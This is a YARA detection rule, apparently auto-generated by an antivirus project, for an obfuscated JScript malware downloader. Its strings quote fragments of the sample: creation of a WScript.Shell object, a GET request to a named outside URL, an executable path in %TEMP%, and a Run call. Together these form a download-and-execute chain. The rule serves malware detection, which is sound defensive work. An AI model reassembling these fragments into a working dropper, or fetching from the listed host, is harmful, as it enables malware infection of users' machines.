rule sig_20160328_0350bed532383ca82b8775bf8d1f15b1 {
  meta:
    description = "datamaliciousorder - file 20160328_0350bed532383ca82b8775bf8d1f15b1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fedd41468306dba1169084ceaffb5069b17c0d9488884cbf87606ca7b8728be9"

  strings:
    $s1  = "function Kjrvpu() {return Typibknh[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Z4g2Vn1zdPbExi.exe\";};" fullword ascii
    $s2  = "do {WScript[Lwyaedk](Njrytr() * 11)} while (Yvrbh[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Typibknh = function Vprwmlsay() {return WScript[Tpvxenehgz](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Yvrbh[Zyudw](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s5  = "function Cuempdz(Tsrkpvo, Pvrrduj){return Tsrkpvo - Pvrrduj;};" fullword ascii
    $s6  = "function Dkmtfgsyq() {return ((Agkfmcyhs == true) && (Agkfmcyhs == Xyqenoels)) ? 1 : Oszifisk;};" fullword ascii
    $s7  = "function Fnmkwrp(Rhpsxufv){Typibknh[\"Run\"](Rhpsxufv, Oszifisk, Oszifisk);};" fullword ascii
    $s8  = "Xyqenoels = true; " fullword ascii
    $s9  = "function Njrytr(){return 22;};" fullword ascii
    $s10 = "Agkfmcyhs = true; " fullword ascii
    $s11 = "var Yzquor = false;" fullword ascii
    $s12 = "function Gekkwses()" fullword ascii
    $s13 = "return Cuempdz(Uvliuwy, Ojcoxxyoqu);" fullword ascii
    $s14 = "function Tespqn(Mqzvdhk) {var Bpljrqu = (1, 2, 3, 4, 5, Mqzvdhk); return Bpljrqu;};" fullword ascii
    $s15 = "var Xyqenoels = false;" fullword ascii
    $s16 = "function Xvbeptftby(){return Jrwnx;};" fullword ascii
    $s17 = "var Agkfmcyhs = false;" fullword ascii
    $s18 = " while (Zhfwpshep){" fullword ascii
    $s19 = "function Zisdypegpb(){return Tpvxenehgz;};" fullword ascii
    $s20 = "var Nuuqzdbkmj = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}